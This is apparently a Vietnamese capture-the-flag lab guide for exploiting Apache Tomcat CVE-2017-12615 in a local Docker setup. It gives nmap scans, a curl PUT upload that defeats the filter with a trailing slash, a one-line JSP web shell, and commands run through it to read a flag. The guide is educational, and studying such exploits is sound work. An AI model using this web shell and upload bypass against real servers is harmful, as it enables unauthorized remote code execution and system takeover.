# Hướng Dẫn Khai Thác Lab: Tomcat RCE (CVE-2017-12615) - The Overly Permissive Admin

Apache Tomcat cung cấp một tính năng mặc định được gọi là `DefaultServlet` để xử lý các yêu cầu tới tài nguyên tĩnh. Tuy nhiên, nếu quản trị viên vô tình thiết lập tham số `readonly` thành `false` trong file `web.xml`, tính năng này sẽ cho phép người dùng từ bên ngoài gửi các yêu cầu HTTP `PUT` và `DELETE` để thao tác trực tiếp với file trên máy chủ. Lợi dụng điều này, kẻ tấn công có thể tải lên mã độc (Web Shell) và chiếm quyền điều khiển toàn bộ server (Remote Code Execution - RCE).

---

## 1. Mục tiêu
Mục tiêu của bài lab này là mô phỏng quá trình tấn công chiếm quyền hệ thống (RCE) thông qua lỗ hổng cấu hình sai trên Apache Tomcat (CVE-2017-12615). Sinh viên sẽ học cách phát hiện phương thức HTTP được mở, vượt qua bộ lọc (WAF/Filter Bypass) cấm tải lên file JSP và thực thi lệnh hệ điều hành để đọc tệp chứa cờ (Flag).

---

## 2. Chuẩn bị môi trường (Setup)

Khởi động môi trường lab bằng Docker Compose. Bạn có thể truyền biến môi trường `EMAIL` để cá nhân hóa Flag.

```bash
# Khởi động lab với email mặc định
docker compose up -d --build


# HOẶC khởi động với email tùy chỉnh
EMAIL=yourname@example.com docker compose up -d --build
```

Sau khi khởi động, website Tomcat mục tiêu sẽ chạy tại: `http://[VICTIM HOST]:8080`

---

## 3. Các bước thực hiện

### Bước 1: Dò quét dịch vụ (Service Reconnaissance)
Sử dụng công cụ Nmap để quét cổng và kiểm tra phiên bản dịch vụ đang chạy trên server.
```bash
nmap -sV -p 8080 127.0.0.1
nmap -sV --script vuln -p 8080 127.0.0.1


```
Bạn sẽ nhận thấy server đang chạy `Apache Tomcat 7.0.70`, một phiên bản có nhiều lỗ hổng đã được công bố.

### Bước 2: Kiểm tra phương thức HTTP PUT (Method Enumeration)
Kiểm tra xem máy chủ có cho phép phương thức `PUT` thông qua lệnh cURL. Hãy thử tạo một file text đơn giản `test.txt`.
```bash
curl -X PUT http://127.0.0.1:8080/test.txt -d "Hello Tomcat"
```
Nếu máy chủ trả về mã lỗi HTTP 201 (Created) hoặc 204 (No Content), việc tải file lên đã thành công! Bạn có thể kiểm tra kết quả bằng cách truy cập `http://127.0.0.1:8080/test.txt`.

### Bước 3: Lách luật và Tải lên Web Shell (Bypass & Exploitation)
Tomcat có cơ chế chặn việc tải lên file `.jsp` (Java Server Page) trực tiếp qua phương thức `PUT` để ngăn chặn thực thi mã độc. 
Tuy nhiên, ta có thể đánh lừa cơ chế kiểm tra đuôi file này bằng cách thêm một ký tự gạch chéo `/` vào cuối tên file.

1. Hãy chuẩn bị một payload JSP siêu nhỏ (Web Shell) dùng để chạy lệnh OS:
```jsp
<% out.println(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\A").next()); %>
```

2. Tải shell lên máy chủ bằng thư viện cURL (Lưu ý dấu `/` ở cuối `shell.jsp/`):
```bash
curl -X PUT http://127.0.0.1:8080/shell.jsp/ -d '<% out.println(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\A").next()); %>'
```
*(Bạn cũng có thể sử dụng Burp Suite Repeater để thao tác dễ nhìn hơn).*

### Bước 4: Thực thi lệnh từ xa (Remote Code Execution)
Sau khi tải lên thành công, file `shell.jsp` thực sự đã nằm trong thư mục gốc của Tomcat.
Lúc này, bạn có thể truyền bất kỳ lệnh Linux nào thông qua tham số `cmd` trên URL.
```bash
# Kiểm tra tài khoản user đang chạy
curl "http://127.0.0.1:8080/shell.jsp?cmd=whoami"

# Liệt kê tệp tin
curl "http://127.0.0.1:8080/shell.jsp?cmd=ls+-la+/"
```

### Bước 5: Đọc Flag hệ thống
Bạn sẽ thấy một tệp nhạy cảm tên là `/flag.txt` nằm trong hệ thống. Hãy thực hiện lệnh cat để đọc nội dung file:
```bash
curl "http://127.0.0.1:8080/shell.jsp?cmd=cat+/flag.txt"
```

---

## 4. Xác minh Flag Dynamic
Bài lab này sử dụng **flag động**, thay đổi theo ngày và email của bạn.

**Mã băm bạn cần thu thập từ lệnh RCE phải khớp với kịch bản sau:**
```bash
echo -n "$(TZ=Asia/Ho_Chi_Minh date +%d%m%Y)_admin@example.com_tomcat_rce_flag" | sha1sum | awk '{print "FLAG{"$1"}"}'
```
*(Hãy thay đổi `admin@example.com` bằng Email của bạn nếu có truyền biến `EMAIL` lúc setup lab).*
